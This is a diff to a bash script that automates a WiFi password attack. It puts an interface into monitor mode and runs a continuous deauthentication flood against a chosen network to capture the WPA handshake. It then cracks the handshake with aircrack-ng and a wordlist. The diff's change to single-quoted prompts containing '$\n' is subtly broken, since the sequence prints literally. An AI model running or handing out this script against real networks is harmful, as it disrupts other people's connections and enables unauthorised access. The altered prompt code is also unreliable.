@@ -11,7 +11,7 @@ interface=$(sanitize_input "$interface")
 airmon-ng check kill
 airmon-ng start "$interface"
 airodump-ng "$interface"
-read -p "Enter the BSSID of the target network: " bssid
+read -p '$\nEnter the BSSID of the target network: ' bssid
 read -p "Enter the Channel number: " channel
 bssid=$(sanitize_input "$bssid")
 channel=$(sanitize_input "$channel")
@@ -23,7 +23,7 @@ output_file="${output_dir}/${bssid}_${timestamp}"
 xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
 pcap_file="${output_file}-01.cap"
 wait
-read -p "Enter the path to your custom wordlist file: " custom_wordlist
+read -p '$\nEnter the path to your custom wordlist file: ' custom_wordlist
 custom_wordlist=$(sanitize_input "$custom_wordlist")
 aircrack-ng -w "$custom_wordlist" "$pcap_file"
 exit 0
